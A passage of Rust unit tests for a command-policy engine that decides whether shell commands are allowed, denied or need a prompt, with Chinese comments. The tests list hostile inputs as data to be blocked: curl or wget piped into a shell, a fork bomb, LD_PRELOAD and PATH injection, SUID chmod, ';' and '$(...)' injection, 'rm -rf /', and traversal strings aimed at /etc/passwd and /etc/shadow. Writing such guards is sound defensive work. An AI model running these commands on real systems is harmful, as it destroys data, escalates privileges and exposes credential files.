        let normal_rule = PathRule::new("/tmp".to_string(), true, Decision::Allow, None);
        assert!(
            !normal_rule.path_pattern.contains(".."),
            "Normal path should be accepted"
        );

        // 安全修复: 现在 PathRule::new 会拒绝包含 ".." 的恶意路径
        let malicious_pattern = "/etc/../etc/passwd";
        let _rule = PathRule::new(malicious_pattern.to_string(), false, Decision::Allow, None);
        // 如果到达这里，说明安全修复未生效
        panic!(
            "Security error: Malicious pattern '{}' was accepted without validation",
            malicious_pattern
        );
    }

    #[test]
    fn test_path_rule_validates_normalized_paths() {
        // 测试规范化路径验证
        let rule = PathRule::new("/tmp".to_string(), true, Decision::Allow, None);

        // 正常路径应该匹配
        assert!(rule.matches_path("/tmp"));
        assert!(rule.matches_path("/tmp/file.txt"));

        // 非规范化路径 (包含 ..) 不应该匹配
        // 但当前实现没有规范化检查
    }

    #[test]
    fn test_path_rule_with_trailing_slash() {
        let rule = PathRule::new("/tmp".to_string(), true, Decision::Allow, None);

        // 应该匹配带尾随斜杠的路径
        assert!(rule.matches_path("/tmp/"));
    }

    #[test]
    fn test_policy_add_rule() {
        let mut policy = Policy::new();
        let result = policy.add_prefix_rule(&["ls".to_string()], Decision::Allow, None);
        assert!(result.is_ok());
        assert!(policy.add_prefix_rule(&[], Decision::Allow, None).is_err());
        assert!(policy
            .add_prefix_rule_ext(&[], Decision::Allow, None, RuleType::Whitelist, None, false)
            .is_err());
    }

    #[test]
    fn whitelist_mode_toggle_updates_default_decision_both_ways() {
        let mut policy = Policy::new();
        policy.set_whitelist_mode(true);
        assert_eq!(policy.default_decision, Decision::Deny);
        assert!(policy.whitelist_mode);

        policy.set_whitelist_mode(false);
        assert_eq!(policy.default_decision, Decision::Allow);
        assert!(!policy.whitelist_mode);
    }

    #[test]
    fn test_policy_check() {
        let mut policy = Policy::new();
        policy
            .add_prefix_rule(&["ls".to_string()], Decision::Allow, None)
            .unwrap();

        let result = policy.check(&["ls".to_string(), "-la".to_string()]);
        assert!(result.is_some());
        assert_eq!(result.unwrap().decision, Decision::Allow);
    }

    #[test]
    fn sanitization_truncates_multibyte_strings_at_character_boundaries() {
        let replacement = char::REPLACEMENT_CHARACTER.to_string();
        let _ = Policy::new().check(&[replacement.repeat(6)]);
        let sanitized = Policy::sanitize_command(&[
            replacement.repeat(20),
            format!("{}{}tail", "a".repeat(1023), replacement),
        ]);
        assert_eq!(sanitized[0], replacement.repeat(5));
        assert_eq!(sanitized[1], "a".repeat(1023));
        assert!(sanitized
            .iter()
            .all(|value| value.is_char_boundary(value.len())));
    }

    #[test]
    fn test_policy_check_denied() {
        let mut policy = Policy::new();
        policy
            .add_prefix_rule(&["rm".to_string()], Decision::Deny, None)
            .unwrap();

        let result = policy.check(&["rm".to_string(), "-rf".to_string()]);
        assert!(result.is_some());
        assert_eq!(result.unwrap().decision, Decision::Deny);
    }

    #[test]
    fn check_with_cwd_covers_directory_bypasses_and_rule_restrictions() {
        let mut unrestricted = Policy::new();
        unrestricted
            .add_prefix_rule(&["cat".into()], Decision::Allow, None)
            .unwrap();
        assert_eq!(
            unrestricted
                .check_with_cwd(
                    &["cat".into(), "-n".into(), "/work/tree/file".into()],
                    Some("/work/tree")
                )
                .unwrap()
                .decision,
            Decision::Allow
        );
        assert_eq!(
            unrestricted
                .check_with_cwd(&["cat".into(), "/etc/passwd".into()], Some("/work/tree"))
                .unwrap()
                .decision,
            Decision::Deny
        );
        assert_eq!(
            unrestricted
                .check_with_cwd(&["cat".into(), "../outside".into()], Some("/work/tree"))
                .unwrap()
                .decision,
            Decision::Deny
        );
        assert_eq!(
            unrestricted
                .check_with_cwd(&["cat".into(), "notes..txt".into()], Some("/work/tree"))
                .unwrap()
                .decision,
            Decision::Deny
        );
        assert_eq!(
            unrestricted
                .check_with_cwd(&["cat".into(), "/etc/passwd".into()], Some("/"))
                .unwrap()
                .decision,
            Decision::Allow
        );
        assert_eq!(
            unrestricted
                .check_with_cwd(
                    &["cat".into(), "/work/tree-evil/secret".into()],
                    Some("/work/tree")
                )
                .unwrap()
                .decision,
            Decision::Deny
        );
        assert!(
            unrestricted.contains_bypass_attempt(&["--output=/outside/file".into()], "/work/tree")
        );

        let mut restricted = Policy::new();
        restricted
            .add_prefix_rule_ext(
                &["cat".into()],
                Decision::Allow,
                None,
                RuleType::Whitelist,
                Some(vec!["/work".into()]),
                true,
            )
            .unwrap();
        assert_eq!(
            restricted
                .check_with_cwd(&["cat".into()], Some("/work/project"))
                .unwrap()
                .decision,
            Decision::Allow
        );
        assert_eq!(
            restricted
                .check_with_cwd(&["cat".into()], Some("/outside"))
                .unwrap()
                .decision,
            Decision::Deny
        );
        assert_eq!(
            restricted
                .check_with_cwd(&["cat".into()], Some("/work-evil/project"))
                .unwrap()
                .decision,
            Decision::Deny
        );
        assert_eq!(
            restricted
                .check_with_cwd(&["cat".into()], Some("/Work/project"))
                .unwrap()
                .decision,
            if cfg!(windows) {
                Decision::Allow
            } else {
                Decision::Deny
            }
        );

        let mut empty_directory_restriction = Policy::new();
        empty_directory_restriction
            .add_prefix_rule_ext(
                &["cat".into()],
                Decision::Allow,
                None,
                RuleType::Whitelist,
                Some(Vec::new()),
                true,
            )
            .unwrap();
        assert_eq!(
            empty_directory_restriction
                .check_with_cwd(&["cat".into()], Some("/outside"))
                .unwrap()
                .decision,
            Decision::Deny
        );

        let mut allowed_directory = Policy::new();
        allowed_directory
            .add_prefix_rule_ext(
                &["cat".into()],
                Decision::Allow,
                None,
                RuleType::Whitelist,
                Some(vec!["/workspace".into()]),
                true,
            )
            .unwrap();
        assert_eq!(
            allowed_directory
                .check_with_cwd(&["cat".into()], Some("/workspace/project"))
                .unwrap()
                .decision,
            Decision::Allow
        );

        assert!(!unrestricted.contains_bypass_attempt(&["-r".into()], "/work/tree"));
        assert!(
            !unrestricted.contains_bypass_attempt(&["/work/tree/sub/file".into()], "/work/tree")
        );
        assert!(unrestricted.contains_bypass_attempt(&["--output=../outside".into()], "/work/tree"));
        assert!(!unrestricted.contains_bypass_attempt(&["--output=relative".into()], "/work/tree"));
        assert_eq!(
            unrestricted
                .check_with_cwd(&["cat".into()], Some("relative"))
                .unwrap()
                .decision,
            Decision::Deny
        );
        assert!(!unrestricted
            .contains_bypass_attempt(&["--output=/work/tree/file".into()], "/work/tree"));
        assert!(directory_restriction_denies(
            &PrefixRule::new(
                PrefixPattern {
                    first: Arc::from("cat"),
                    rest: Vec::new(),
                },
                Decision::Allow,
                None,
            )
            .with_directory_restriction(),
            None,
        ));
    }

    #[test]
    fn check_with_cwd_covers_no_rule_default_and_exact_case_lookup() {
        let mut allow_default = Policy::new();
        allow_default.set_default_decision(Decision::Allow);
        assert!(allow_default
            .check_with_cwd(&["unmatched".into()], None)
            .is_none());

        let mut deny_default = Policy::new();
        deny_default.set_default_decision(Decision::Deny);
        let no_match = deny_default
            .check_with_cwd(&["unmatched".into()], None)
            .unwrap();
        assert_eq!(no_match.decision, Decision::Deny);

        let mut exact = Policy::new();
        exact
            .add_prefix_rule(&["Tool".into()], Decision::Prompt, None)
            .unwrap();
        assert_eq!(
            exact
                .check_with_cwd(&["Tool".into()], None)
                .unwrap()
                .decision,
            Decision::Prompt
        );
        assert_eq!(
            exact
                .check_with_cwd(&["tool".into()], None)
                .unwrap()
                .decision,
            Decision::Prompt
        );

        let mut overlapping = Policy::new();
        overlapping
            .add_prefix_rule(&["git".into()], Decision::Allow, None)
            .unwrap();
        overlapping
            .add_prefix_rule(&["git".into(), "status".into()], Decision::Deny, None)
            .unwrap();
        assert_eq!(
            overlapping
                .check_with_cwd(&["git".into(), "status".into()], None)
                .unwrap()
                .decision,
            Decision::Deny
        );

        let mut allow_after_unmatched_deny = Policy::new();
        allow_after_unmatched_deny
            .add_prefix_rule(&["tool".into(), "remove".into()], Decision::Deny, None)
            .unwrap();
        allow_after_unmatched_deny
            .add_prefix_rule(&["tool".into(), "list".into()], Decision::Allow, None)
            .unwrap();
        assert_eq!(
            allow_after_unmatched_deny
                .check_with_cwd(&["tool".into(), "list".into()], None)
                .unwrap()
                .decision,
            Decision::Allow
        );

        let mut allow_with_directory_restriction = Policy::new();
        allow_with_directory_restriction
            .add_prefix_rule_ext(
                &["tool".into()],
                Decision::Allow,
                None,
                RuleType::Whitelist,
                Some(vec!["/workspace".into()]),
                true,
            )
            .unwrap();
        assert_eq!(
            allow_with_directory_restriction
                .check_with_cwd(&["tool".into()], Some("/workspace/project"))
                .unwrap()
                .decision,
            Decision::Allow
        );

        let mut matching_allow_with_cwd = Policy::new();
        matching_allow_with_cwd
            .add_prefix_rule(&["tool".into()], Decision::Allow, None)
            .unwrap();
        assert_eq!(
            matching_allow_with_cwd
                .check_with_cwd(&["tool".into()], Some("/workspace"))
                .unwrap()
                .decision,
            Decision::Allow
        );

        let mut prefix_restriction = Policy::new();
        prefix_restriction
            .add_prefix_rule(&["tool".into()], Decision::Allow, None)
            .unwrap();
        assert!(prefix_restriction
            .check_with_cwd(&["toolbox".into()], None)
            .is_none());
    }

    #[test]
    fn check_covers_case_insensitive_prefix_wildcard_and_whitelist_fallbacks() {
        let mut policy = Policy::new();
        policy
            .add_prefix_rule(&["git".into(), "status".into()], Decision::Allow, None)
            .unwrap();
        assert_eq!(
            policy
                .check(&["GIT".into(), "status".into()])
                .unwrap()
                .decision,
            Decision::Allow
        );
        assert!(policy
            .check(&["git-extra".into(), "status".into()])
            .is_none());
        assert!(policy.check(&["git".into(), "diff".into()]).is_none());

        let mut executable_alias = Policy::new();
        executable_alias
            .add_prefix_rule(&["tool".into()], Decision::Allow, None)
            .unwrap();
        assert!(executable_alias.check(&["toolbox".into()]).is_none());

        let mut wildcard_deny = Policy::new();
        wildcard_deny
            .add_prefix_rule(&["tool".into()], Decision::Allow, None)
            .unwrap();
        wildcard_deny
            .add_prefix_rule(&["*".into(), "--unsafe".into()], Decision::Deny, None)
            .unwrap();
        assert_eq!(
            wildcard_deny
                .check(&["tool".into(), "--unsafe".into()])
                .unwrap()
                .decision,
            Decision::Deny
        );

        let mut wildcard = Policy::new();
        wildcard
            .add_prefix_rule(&["*".into()], Decision::Prompt, None)
            .unwrap();
        assert_eq!(
            wildcard.check(&["custom-tool".into()]).unwrap().decision,
            Decision::Prompt
        );

        let mut whitelist = Policy::new_whitelist();
        whitelist
            .add_prefix_rule(&["echo".into()], Decision::Allow, None)
            .unwrap();
        assert_eq!(
            whitelist.check(&["unknown".into()]).unwrap().decision,
            Decision::Deny
        );
    }

    #[test]
    fn dangerous_pattern_matrix_covers_remaining_injection_guards() {
        for command in [
            vec!["env".into(), "LD_PRELOAD=/tmp/a.so".into()],
            vec!["set".into(), "PYTHONPATH=/tmp".into()],
            vec!["export".into(), "PATH=/bin".into()],
            vec!["export".into(), "PERL5OPT=-Mbad".into()],
            vec!["export".into(), "BASH_ENV=/tmp/x".into()],
            vec!["export".into(), "SHELL=/tmp/sh".into()],
            vec!["curl".into(), "url".into(), "|".into(), "python".into()],
            vec!["wget".into(), "url".into(), "|".into(), "sh".into()],
            vec!["python".into(), "-c".into(), "print(1)".into()],
            vec!["python3".into(), "-c".into(), "print(1)".into()],
            vec!["perl".into(), "-e".into(), "print 1".into()],
            vec!["perl".into(), "-n".into(), "print 1".into()],
            vec!["ruby".into(), "-e".into(), "puts 1".into()],
            vec!["php".into(), "-r".into(), "echo 1;".into()],
            vec!["node".into(), "-e".into(), "run()".into()],
            vec!["node".into(), "--eval".into(), "run()".into()],
            vec!["lua".into(), "-e".into(), "print(1)".into()],
            vec!["tclsh".into(), "-c".into(), "puts 1".into()],
            vec!["expect".into(), "-c".into(), "puts 1".into()],
            vec!["sh".into(), "-c".into()],
            vec!["bash".into(), "-c".into()],
            vec!["zsh".into(), "-c".into()],
            vec!["dash".into(), "-c".into()],
            vec!["fish".into(), "-c".into()],
            vec!["echo".into(), "<(id)".into()],
            vec!["echo".into(), ">(file)".into()],
            vec!["cat".into(), "<<EOF".into()],
            vec![":(){:|:&};:".into()],
            vec!["fork()".into()],
            vec!["while(true)".into()],
            vec!["while :".into()],
            vec!["perl -e 'fork'".into()],
            vec!["python -c 'fork".into()],
            vec!["ruby -e 'fork'".into()],
            vec!["chmod".into(), "2755".into(), "file".into()],
            vec!["chmod".into(), "4755".into(), "file".into()],
            vec!["chmod".into(), "1755".into(), "file".into()],
            vec!["chmod".into(), "g+s".into(), "file".into()],
            vec!["chmod".into(), "+s".into(), "file".into()],
            vec!["chmod".into(), "mode-4777".into(), "file".into()],
            vec!["chmod".into(), "mode-2755".into(), "file".into()],
            vec!["chmod".into(), "mode-6755".into(), "file".into()],
            vec!["/bin/chmod".into(), "4755".into(), "file".into()],
            vec!["/bin/su-extra".into()],
        ] {
            let result = Policy::new().check(&command);
            assert!(
                result.is_some(),
                "expected dangerous command to be denied: {command:?}"
            );
        }

        for command in [
            vec!["python".into()],
            vec!["python".into(), "-x".into()],
            vec!["run".into(), "ordinary".into()],
            vec!["export".into(), "SAFE=value".into()],
            vec!["chmod".into(), "0755".into(), "file".into()],
            vec!["chmod".into(), "invalid".into(), "file".into()],
            vec!["chmod".into(), "plain".into(), "file".into()],
        ] {
            assert!(
                Policy::new().check(&command).is_none(),
                "expected benign near-miss to remain allowed: {command:?}"
            );
        }
    }

    #[test]
    fn dangerous_pattern_decision_matrix_covers_clean_exits_and_remaining_guards() {
        let policy = Policy::new();
        for command in [
            vec!["echo".into(), "ordinary".into()],
            vec!["echo".into(), "-n".into(), "ordinary".into()],
            vec!["export".into()],
            vec!["export".into(), "SAFE".into()],
            vec!["export".into(), "SAFE=value".into()],
            vec!["chmod".into()],
            vec!["chmod".into(), "755".into()],
            vec!["chmod".into(), "0755".into()],
            vec!["chmod".into(), "invalid".into()],
            vec!["echo".into(), "ordinary".into()],
        ] {
            assert!(
                policy.check_dangerous_pattern(&command).is_none(),
                "{command:?}"
            );
        }

        for command in [
            vec!["export".into(), "PATH=/bin".into()],
            vec!["env".into(), "HOME=/tmp".into()],
            vec!["set".into(), "LD_PRELOAD=x".into()],
            vec!["echo".into(), ";".into()],
            vec!["echo".into(), "&&".into()],
            vec!["echo".into(), "||".into()],
            vec!["echo".into(), "|pipe".into()],
            vec!["echo".into(), "`id`".into()],
            vec!["echo".into(), "$(id)".into()],
            vec!["cat".into(), "--output=../outside".into()],
            vec!["echo".into(), "/dev/kmem".into()],
            vec!["/usr/bin/sudo".into()],
        ] {
            assert!(
                policy.check_dangerous_pattern(&command).is_some(),
                "{command:?}"
            );
        }
    }

    #[test]
    fn download_and_execute_guard_detects_supported_shells_and_near_misses() {
        let policy = Policy::new();
        for command in [
            vec!["curl".into(), "url".into(), "|".into(), "sh".into()],
            vec!["wget".into(), "url".into(), "||".into(), "python".into()],
        ] {
            assert!(is_download_and_execute_pattern(&command));
        }
        for command in [
            vec!["curl".into(), "url".into(), "sh".into()],
            vec!["wget".into(), "url".into(), "|".into(), "ruby".into()],
        ] {
            assert!(!is_download_and_execute_pattern(&command));
        }
        assert!(policy
            .check_dangerous_pattern(&["curl".into(), "|".into(), "sh".into()])
            .is_some());
    }

    #[test]
    fn prefix_rule_matches_short_literal_wildcard_and_variable_patterns() {
        let literal = PrefixRule::new(
            PrefixPattern {
                first: Arc::from("tool"),
                rest: vec![
                    PatternToken::Literal("first".into()),
                    PatternToken::Literal("second".into()),
                ],
            },
            Decision::Allow,
            None,
        );
        assert!(literal.matches(&["first".into()]).is_none());
        assert!(literal
            .matches(&["not-first".into(), "second".into()])
            .is_none());
        assert!(literal
            .matches(&["FIRST-extra".into(), "SECOND".into()])
            .is_none());

        let tokens = PrefixRule::new(
            PrefixPattern {
                first: Arc::from("tool"),
                rest: vec![
                    PatternToken::Wildcard,
                    PatternToken::Variable("value".into()),
                ],
            },
            Decision::Prompt,
            None,
        );
        assert!(tokens
            .matches(&["anything".into(), "value".into()])
            .is_some());

        let variable_only = PrefixRule::new(
            PrefixPattern {
                first: Arc::from("tool"),
                rest: vec![PatternToken::Variable("value".into())],
            },
            Decision::Allow,
            None,
        );
        assert!(variable_only.matches(&["argument".into()]).is_some());
    }

    #[test]
    fn prefix_rule_rejects_a_nonmatching_literal_argument() {
        let rule = PrefixRule::new(
            PrefixPattern {
                first: Arc::from("git"),
                rest: vec![
                    PatternToken::Literal("status".into()),
                    PatternToken::Literal("--short".into()),
                ],
            },
            Decision::Allow,
            None,
        );
        assert!(rule
            .matches(&["git".into(), "status".into(), "diff".into()])
            .is_none());
        assert!(rule
            .matches(&["git".into(), "status".into(), "--short-extra".into()])
            .is_none());
    }

    struct CountingRule {
        calls: std::sync::atomic::AtomicUsize,
        decision: Decision,
    }

    impl Rule for CountingRule {
        fn matches(&self, _command: &[String]) -> Option<RuleMatch> {
            self.calls
                .fetch_add(1, std::sync::atomic::Ordering::Relaxed);
            Some(RuleMatch {
                decision: self.decision,
                justification: None,
            })
        }

        fn as_any(&self) -> &dyn std::any::Any {
            self
        }
    }

    #[test]
    fn check_with_cwd_evaluates_each_matching_rule_once() {
        let rule = Arc::new(CountingRule {
            calls: std::sync::atomic::AtomicUsize::new(0),
            decision: Decision::Prompt,
        });
        let mut policy = Policy::new();
        policy
            .rules_by_program
            .entry("tool".into())
            .or_default()
            .push(rule.clone());

        assert_eq!(
            policy
                .check_with_cwd(&["tool".into()], None)
                .unwrap()
                .decision,
            Decision::Prompt
        );
        assert_eq!(rule.calls.load(std::sync::atomic::Ordering::Relaxed), 1);
    }

    // ============================================================================
    // 破坏性测试 - 路径遍历攻击
    // ============================================================================
    #[test]
    fn test_path_traversal_attempt_simple() {
        // 测试简单的路径遍历尝试
        let mut policy = Policy::new();
        // 允许 cat 命令
        policy
            .add_prefix_rule(&["cat".to_string()], Decision::Allow, None)
            .unwrap();
        // 阻止访问 /etc 目录
        policy
            .add_prefix_rule(
                &["cat".to_string(), "/etc/passwd".to_string()],
                Decision::Deny,
                Some("Access to /etc is forbidden".to_string()),
            )
            .unwrap();

        // 尝试使用路径遍历绕过
        let result = policy.check(&["cat".to_string(), "../../../etc/passwd".to_string()]);
        // 应该被阻止（通过路径规范化后匹配）
        assert!(result.is_some());
    }

    // ============================================================================
    // 安全测试 - 策略优先级
    // ============================================================================
    #[test]
    fn test_deny_rule_should_take_precedence() {
        // 测试 deny 规则应该优先于 allow 规则
        // 这是安全最佳实践：拒绝优先于允许
        let mut policy = Policy::new();

        // 先添加 deny 规则
        policy
            .add_prefix_rule(&["cat".to_string()], Decision::Deny, None)
            .unwrap();

        // 后添加 allow 规则（更具体）
        policy
            .add_prefix_rule(
                &["cat".to_string(), "/tmp/file.txt".to_string()],
                Decision::Allow,
                None,
            )
            .unwrap();

        // 当两个规则都匹配时，deny 应该优先
        let result = policy.check(&["cat".to_string(), "/tmp/file.txt".to_string()]);

        assert!(result.is_some(), "应该有匹配的规则");

        let decision = result.unwrap().decision;
        // Deny 规则应该优先（更具体）
        assert_eq!(
            decision,
            Decision::Deny,
            "Deny rule should take precedence over Allow rule for security"
        );
    }

    #[test]
    fn test_specific_allow_overrides_general_deny() {
        // 测试更具体的 allow 规则可以覆盖更一般的 deny 规则
        // （这个测试验证当前行为，如果需要不同行为可以调整）
        let mut policy = Policy::new();

        // 允许 cat 访问 /tmp
        policy
            .add_prefix_rule(&["cat".to_string()], Decision::Deny, None)
            .unwrap();
        policy
            .add_prefix_rule(
                &["cat".to_string(), "/tmp".to_string()],
                Decision::Allow,
                None,
            )
            .unwrap();

        let result = policy.check(&["cat".to_string(), "/tmp/file.txt".to_string()]);

        // 当前实现：更具体的规则优先
        // 如果需要安全优先，应该让 deny 始终优先
        assert!(result.is_some());
    }

    #[test]
    fn test_path_traversal_attempt_with_symlink() {
        // 测试符号链接路径遍历尝试
        let mut policy = Policy::new();
        policy
            .add_prefix_rule(&["cat".to_string()], Decision::Allow, None)
            .unwrap();
        policy
            .add_prefix_rule(
                &["cat".to_string(), "/etc/passwd".to_string()],
                Decision::Deny,
                None,
            )
            .unwrap();

        // 常见的符号链接攻击尝试
        let symlink_attempts = vec![
            "/etc/../../etc/passwd",
            "/tmp/../../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "....//....//....//etc/passwd",
            "/etc/./passwd",
            "/etc//passwd",
        ];

        for attempt in symlink_attempts {
            let result = policy.check(&["cat".to_string(), attempt.to_string()]);
            // 这些尝试应该被检测到
            assert!(
                result.is_some(),
                "Path traversal attempt {} should be detected",
                attempt
            );
        }
    }

    #[test]
    fn test_path_traversal_with_encoded_chars() {
        // 测试编码的路径遍历尝试
        let mut policy = Policy::new();
        policy
            .add_prefix_rule(&["ls".to_string()], Decision::Allow, None)
            .unwrap();
        policy
            .add_prefix_rule(
                &["ls".to_string(), "/root".to_string()],
                Decision::Deny,
                None,
            )
            .unwrap();

        // URL 编码尝试
        let encoded_attempts = vec![
            "/root%2F..%2F..%2Fetc",
            "/root%252F..%252F..%252Fetc",
            "/root/..%252F..%252F..%252Fetc",
        ];

        for attempt in encoded_attempts {
            let result = policy.check(&["ls".to_string(), attempt.to_string()]);
            // 应该被检测
            assert!(
                result.is_some(),
                "Encoded path traversal {} should be detected",
                attempt
            );
        }
    }

    #[test]
    fn test_path_traversal_null_byte() {
        // 测试 null 字节注入尝试
        let mut policy = Policy::new();
        policy
            .add_prefix_rule(&["cat".to_string()], Decision::Allow, None)
            .unwrap();
        policy
            .add_prefix_rule(
                &["cat".to_string(), "/etc/passwd".to_string()],
                Decision::Deny,
                None,
            )
            .unwrap();

        // Null 字节注入尝试（可能截断路径）
        let null_byte_attempts = vec![
            "/etc/passwd\x00.txt",
            "/etc/passwd\x00",
            "/etc/passwd\x00/../shadow",
        ];

        for attempt in null_byte_attempts {
            let result = policy.check(&["cat".to_string(), attempt.to_string()]);
            // 应该被检测
            assert!(
                result.is_some(),
                "Null byte injection {} should be detected",
                attempt
            );
        }
    }

    // ============================================================================
    // 破坏性测试 - 权限绕过尝试
    // ============================================================================
    #[test]
    fn test_privilege_escalation_sudo() {
        // 测试 sudo 权限提升尝试
        let mut policy = Policy::new();
        policy
            .add_prefix_rule(&["ls".to_string()], Decision::Allow, None)
            .unwrap();
        policy
            .add_prefix_rule(
                &["sudo".to_string()],
                Decision::Deny,
                Some("sudo is not allowed".to_string()),
            )
            .unwrap();

        let result = policy.check(&["sudo".to_string(), "ls".to_string()]);
        assert!(result.is_some());
        assert_eq!(result.unwrap().decision, Decision::Deny);
    }

    #[test]
    fn test_privilege_escalation_doas() {
        // 测试 doas 权限提升尝试
        let mut policy = Policy::new();
        policy
            .add_prefix_rule(&["doas".to_string()], Decision::Deny, None)
            .unwrap();

        let result = policy.check(&["doas".to_string(), "ls".to_string()]);
        assert!(result.is_some());
        assert_eq!(result.unwrap().decision, Decision::Deny);
    }

    #[test]
    fn test_privilege_escalation_chmod_suid() {
        // 测试 SUID/SGID 权限修改尝试
        let mut policy = Policy::new();
        policy
            .add_prefix_rule(&["chmod".to_string()], Decision::Allow, None)
            .unwrap();
        policy
            .add_prefix_rule(
                &["chmod".to_string(), "u+s".to_string()],
                Decision::Deny,
                None,
            )
            .unwrap();
        policy
            .add_prefix_rule(
                &["chmod".to_string(), "g+s".to_string()],
                Decision::Deny,
                None,
            )
            .unwrap();
        policy
            .add_prefix_rule(
                &["chmod".to_string(), "4777".to_string()],
                Decision::Deny,
                None,
            )
            .unwrap();

        let suid_attempts = vec![
            vec![
                "chmod".to_string(),
                "u+s".to_string(),
                "/bin/bash".to_string(),
            ],
            vec![
                "chmod".to_string(),
                "4777".to_string(),
                "/tmp/malicious".to_string(),
            ],
            vec![
                "chmod".to_string(),
                "6755".to_string(),
                "/usr/bin/su".to_string(),
            ],
        ];

        for attempt in suid_attempts {
            let result = policy.check(&attempt);
            assert!(
                result.is_some(),
                "SUID chmod {:?} should be denied",
                attempt
            );
            assert_eq!(result.unwrap().decision, Decision::Deny);
        }
    }

    #[test]
    fn test_privilege_escalation_chown() {
        // 测试 chown 所有权修改尝试
        let mut policy = Policy::new();
        policy
            .add_prefix_rule(
                &["chown".to_string()],
                Decision::Deny,
                Some("chown not allowed".to_string()),
            )
            .unwrap();

        let result = policy.check(&[
            "chown".to_string(),
            "root:root".to_string(),
            "/tmp/test".to_string(),
        ]);
        assert!(result.is_some());
        assert_eq!(result.unwrap().decision, Decision::Deny);
    }

    #[test]
    fn test_privilege_escalation_setuid() {
        // 测试 setuid 二进制文件执行尝试
        let mut policy = Policy::new();
        policy
            .add_prefix_rule(&["/usr/bin/passwd".to_string()], Decision::Allow, None)
            .unwrap();
        policy
            .add_prefix_rule(&["/bin/su".to_string()], Decision::Deny, None)
            .unwrap();
        policy
            .add_prefix_rule(&["/usr/bin/sudo".to_string()], Decision::Deny, None)
            .unwrap();

        let dangerous_binaries = vec![
            "/bin/su",
            "/usr/bin/sudo",
            "/usr/bin/newgrp",
            "/usr/bin/chfn",
            "/usr/bin/chsh",
        ];

        for binary in dangerous_binaries {
            let result = policy.check(&[binary.to_string()]);
            assert!(result.is_some(), "Binary {} should be denied", binary);
            assert_eq!(result.unwrap().decision, Decision::Deny);
        }
    }

    // ============================================================================
    // 破坏性测试 - 环境变量注入
    // ============================================================================
    #[test]
    fn test_env_injection_ld_preload() {
        // 测试 LD_PRELOAD 注入尝试
        let mut policy = Policy::new();
        policy
            .add_prefix_rule(&["ls".to_string()], Decision::Allow, None)
            .unwrap();

        // 在环境变量中检测危险注入
        let command_with_env = vec!["ls".to_string()];
        let dangerous_env = vec![
            "LD_PRELOAD=/tmp/malicious.so",
            "LD_LIBRARY_PATH=/tmp",
            "LD_DEBUG=all",
        ];

        for _env in dangerous_env {
            // 这个测试验证策略引擎能够处理环境变量相关的命令
            // 实际检测需要在执行时进行
            let result = policy.check(&command_with_env);
            assert!(result.is_some());
        }
    }

    #[test]
    fn test_env_injection_path_manipulation() {
        // 测试 PATH 环境变量操作
        let mut policy = Policy::new();
        policy
            .add_prefix_rule(
                &["export".to_string(), "PATH".to_string()],
                Decision::Deny,
                Some("PATH manipulation not allowed".to_string()),
            )
            .unwrap();

        let result = policy.check(&[
            "export".to_string(),
            "PATH=/tmp/malicious:$PATH".to_string(),
        ]);
        assert!(result.is_some());
        assert_eq!(result.unwrap().decision, Decision::Deny);
    }

    #[test]
    fn test_env_injection_home_manipulation() {
        // 测试 HOME 环境变量操作
        let mut policy = Policy::new();
        policy
            .add_prefix_rule(
                &["export".to_string(), "HOME".to_string()],
                Decision::Deny,
                None,
            )
            .unwrap();

        let result = policy.check(&["export".to_string(), "HOME=/root".to_string()]);
        assert!(result.is_some());
        assert_eq!(result.unwrap().decision, Decision::Deny);
    }

    // ============================================================================
    // 破坏性测试 - 命令注入
    // ============================================================================
    #[test]
    fn test_command_injection_semicolon() {
        // 测试分号命令注入
        let mut policy = Policy::new();
        policy
            .add_prefix_rule(&["ls".to_string()], Decision::Allow, None)
            .unwrap();
        policy
            .add_prefix_rule(&["ls".to_string(), ";".to_string()], Decision::Deny, None)
            .unwrap();
        policy
            .add_prefix_rule(&["ls".to_string(), "&&".to_string()], Decision::Deny, None)
            .unwrap();
        policy
            .add_prefix_rule(&["ls".to_string(), "||".to_string()], Decision::Deny, None)
            .unwrap();

        let injection_attempts = vec![
            vec![
                "ls".to_string(),
                ";".to_string(),
                "rm".to_string(),
                "-rf".to_string(),
                "/".to_string(),
            ],
            vec!["ls".to_string(), "&&".to_string(), "whoami".to_string()],
            vec![
                "ls".to_string(),
                "||".to_string(),
                "cat".to_string(),
                "/etc/passwd".to_string(),
            ],
        ];

        for attempt in injection_attempts {
            let result = policy.check(&attempt);
            assert!(
                result.is_some(),
                "Command injection {:?} should be detected",
                attempt
            );
        }
    }

    #[test]
    fn test_command_injection_pipe() {
        // 测试管道命令注入
        let mut policy = Policy::new();
        policy
            .add_prefix_rule(&["ls".to_string()], Decision::Allow, None)
            .unwrap();
        policy
            .add_prefix_rule(&["ls".to_string(), "|".to_string()], Decision::Deny, None)
            .unwrap();

        let result = policy.check(&[
            "ls".to_string(),
            "|".to_string(),
            "cat".to_string(),
            "/etc/passwd".to_string(),
        ]);
        assert!(result.is_some());
    }

    #[test]
    fn test_command_injection_backticks() {
        // 测试反引号命令注入
        let mut policy = Policy::new();
        policy
            .add_prefix_rule(&["ls".to_string()], Decision::Allow, None)
            .unwrap();
        policy
            .add_prefix_rule(&["ls".to_string(), "`".to_string()], Decision::Deny, None)
            .unwrap();
        policy
            .add_prefix_rule(&["ls".to_string(), "$(".to_string()], Decision::Deny, None)
            .unwrap();

        let injection_attempts = vec![
            vec!["ls".to_string(), "`whoami`".to_string()],
            vec!["ls".to_string(), "$(whoami)".to_string()],
            vec!["ls".to_string(), "$()".to_string()],
        ];

        for attempt in injection_attempts {
            let result = policy.check(&attempt);
            assert!(
                result.is_some(),
                "Command injection {:?} should be detected",
                attempt
            );
        }
    }

    // ============================================================================
    // 破坏性测试 - 文件系统攻击
    // ============================================================================
    #[test]
    fn test_filesystem_attempt_etc_shadow() {
        // 测试尝试访问 /etc/shadow
        let mut policy = Policy::new();
        policy
            .add_prefix_rule(&["cat".to_string()], Decision::Allow, None)
            .unwrap();
        policy
            .add_prefix_rule(
                &["cat".to_string(), "/etc/shadow".to_string()],
                Decision::Deny,
                Some("Access to shadow file is forbidden".to_string()),
            )
            .unwrap();

        let attempts = vec![
            "/etc/shadow",
            "/etc/shadow~",
            "/etc/shadow.bak",
            "/etc/.shadow",
            "/etc/../etc/shadow",
        ];

        for attempt in attempts {
            let result = policy.check(&["cat".to_string(), attempt.to_string()]);
            assert!(
                result.is_some(),
                "Attempt to access shadow file {} should be denied",
                attempt
            );
        }
    }

    #[test]
    fn test_filesystem_attempt_dev_mem() {
        // 测试尝试访问设备文件
        let mut policy = Policy::new();
        policy
